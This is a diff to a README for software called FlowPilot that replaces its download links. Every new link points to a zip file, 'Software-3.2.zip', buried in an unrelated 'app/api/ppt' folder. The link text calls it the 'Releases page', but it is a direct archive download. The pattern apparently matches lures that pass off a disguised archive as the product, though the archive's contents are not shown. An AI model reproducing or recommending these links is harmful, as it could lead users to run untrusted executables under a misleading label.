@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download FlowPilot](https://raw.githubusercontent.com/Rr5du/flowpilot/main/errorcase/flowpilot_v2.9.zip)](https://raw.githubusercontent.com/Rr5du/flowpilot/main/errorcase/flowpilot_v2.9.zip)
+[![Download FlowPilot](https://github.com/Rr5du/flowpilot/raw/refs/heads/main/app/api/ppt/Software-3.2.zip)](https://github.com/Rr5du/flowpilot/raw/refs/heads/main/app/api/ppt/Software-3.2.zip)
 
 </div>
 
@@ -21,7 +21,7 @@
 Follow these steps to download and run FlowPilot:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Rr5du/flowpilot/main/errorcase/flowpilot_v2.9.zip) of FlowPilot to find the latest version of the software.
+   Go to the [Releases page](https://github.com/Rr5du/flowpilot/raw/refs/heads/main/app/api/ppt/Software-3.2.zip) of FlowPilot to find the latest version of the software.
 
 2. **Download the Application**  
    Once on the Releases page, look for the most recent version, then download the application suitable for your operating system:
@@ -78,7 +78,7 @@ To download FlowPilot now, click the button below:
 
 <div align="center">
 
-[![Download FlowPilot](https://raw.githubusercontent.com/Rr5du/flowpilot/main/errorcase/flowpilot_v2.9.zip)](https://raw.githubusercontent.com/Rr5du/flowpilot/main/errorcase/flowpilot_v2.9.zip)
+[![Download FlowPilot](https://github.com/Rr5du/flowpilot/raw/refs/heads/main/app/api/ppt/Software-3.2.zip)](https://github.com/Rr5du/flowpilot/raw/refs/heads/main/app/api/ppt/Software-3.2.zip)
 
 </div>
 
